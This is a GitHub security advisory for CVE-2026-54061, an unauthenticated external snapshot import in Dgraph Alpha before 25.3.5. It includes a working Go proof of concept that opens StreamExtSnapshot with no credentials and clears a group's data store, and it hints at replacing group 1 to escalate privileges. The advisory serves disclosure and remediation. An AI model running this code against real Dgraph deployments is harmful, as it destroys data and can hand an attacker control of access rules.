# [C] Dgraph Alpha group stores can be replaced via unauthenticated external snapshot import

## Summary
Severity: Critical
Advisory: GHSA-rrwh-6jrq-wp5v
CVE: CVE-2026-54061
CWE: CWE-306
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-08-20
Source: https://github.com/advisories/GHSA-rrwh-6jrq-wp5v
Type: github-advisory

## Affected
- Go: `github.com/dgraph-io/dgraph/v25` — affected >=0 <25.3.5

## Details
## Summary

Dgraph Alpha exposes the RPCs used for external snapshot import on the public gRPC port `:9080` without authentication or authorization. As a result, an unauthenticated network client can open `StreamExtSnapshot` and send Badger stream data to the target group’s store. In addition, the receiver calls `Prepare()` before processing the stream. This operation deletes and replaces the existing DB data.

## Root Cause

The root cause is that the RPCs used for external snapshot import are exposed through Alpha’s public gRPC service, but no administrator authorization check is performed before reaching destructive storage operations.

Streaming RPCs such as `StreamExtSnapshot` do not have a stream interceptor, and the RPC handlers do not perform their own authorization checks. As a result, an unauthenticated client that can reach the public gRPC port can start the import flow. Dgraph then calls Badger’s `StreamWriter.Prepare()` on the target group store. This operation deletes the existing database, allowing the attacker’s stream to potentially replace the store.

## Steps to Reproduce

Preconditions:

- A throwaway Dgraph Alpha is reachable on its public gRPC port, default `:9080`
- Public gRPC mTLS is not enabled
- No Dgraph ACL token, JWT, or gRPC `auth-token` metadata is used by the client

1. Start a throwaway standalone Dgraph instance from the tested build and insert synthetic data.

```bash
# Example if the tested source tree is built and tagged locally.
docker run --rm -p 8080:8080 -p 9080:9080 \
  -v "$PWD/dgraph-ext-snapshot-poc:/dgraph" \
  dgraph-standalone:2b6d6328d
```

For example, insert a harmless record.

```bash
curl -sS -X POST "http://127.0.0.1:8080/mutate?commitNow=true" \
  -H "Content-Type: application/rdf" \
  --data-binary $'{ set { _:poc <name> "before-import" . } }'
```

2. From an unauthenticated client, open `Dgraph.StreamExtSnapshot` and select group 1 as the target group.

```go
package main

import (
    "context"
    "fmt"
    "io"
    "log"

    "github.com/dgraph-io/dgo/v250"
    "github.com/dgraph-io/dgo/v250/protos/api"
)

func main() {
    ctx := context.Background()

    // No JWT or auth metadata is attached.
    dg, err := dgo.Open("dgraph://127.0.0.1:9080")
    if err != nil {
        log.Fatal(err)
    }
    defer dg.Close()

    client := dg.GetAPIClients()[0]
    stream, err := client.StreamExtSnapshot(ctx)
    if err != nil {
        log.Fatal(err)
    }

    if err := stream.Send(&api.StreamExtSnapshotRequest{GroupId: 1}); err != nil {
        log.Fatal(err)
    }
    if _, err := stream.Recv(); err != nil {
        log.Fatal(err)
    }

    // Complete an empty external snapshot stream. On the server side,
    // the local subscriber calls StreamWriter.Prepare() before consuming
    // packets from the stream.
    if err := stream.Send(&api.StreamExtSnapshotRequest{
        Pkt: &api.StreamPacket{Done: true},
    }); err != nil {
        log.Fatal(err)
    }

    for {
        resp, err := stream.Recv()
        if err == io.EOF {
            break
        }
        if err != nil {
            log.Fatal(err)
        }
        if resp.GetFinish() {
            fmt.Println("unauthenticated external snapshot stream finished")
            break
        }
    }
}
```

Observed result:

- The unauthenticated stream is accepted.
- No prior `UpdateExtSnapshotStreamingState(Start)` call is required.
- `worker.runLocalSubscriber(...)` calls `pstore.NewStreamWriter().Prepare()`.
- Badger drops the existing target group DB before the stream completes.
- The synthetic data that existed before the stream is no longer served from the cleared group store.

The official import client demonstrates the same wire format and call order: `dgraph/cmd/dgraphimport/import_client.go` opens `dgo.Open(...)`, calls `StreamExtSnapshot`, sends a first `GroupId` message, and then streams `api.StreamPacket.Data` chunks followed by `Done: true`.

This Done-only PoC demonstrates unauthenticated clear/empty replacement of the selected group store. To additionally demonstrate attacker-controlled non-empty replacement, send valid Badger stream chunks in `api.StreamPacket.Data` before `Done: true`.

## Impact

An unauthenticated attacker who can reach Alpha’s public gRPC port can clear a selected Dgraph group store or replace it with attacker-supplied Badger stream data. In ACL-enabled deployments, group 1 stores Dgraph’s ACL/internal predicates, so replacing group 1 may also lead to privilege escalation.

## Suggested Remediation

1. Require administrator authorization before `UpdateExtSnapshotStreamingState` calls `worker.ProposeDrain(...)`.
2. Require the same authorization at the start of `StreamExtSnapshot` using `stream.Context()`.
3. Add a gRPC stream interceptor so streaming RPCs receive the same auth and audit treatment as unary RPCs.
4. Reject `StreamExtSnapshot` unless import mode was explicitly armed by an authorized request.

## References
- https://github.com/dgraph-io/dgraph/security/advisories/GHSA-rrwh-6jrq-wp5v
- https://nvd.nist.gov/vuln/detail/CVE-2026-54061
- https://github.com/dgraph-io/dgraph
- https://github.com/dgraph-io/dgraph/releases/tag/v25.3.5
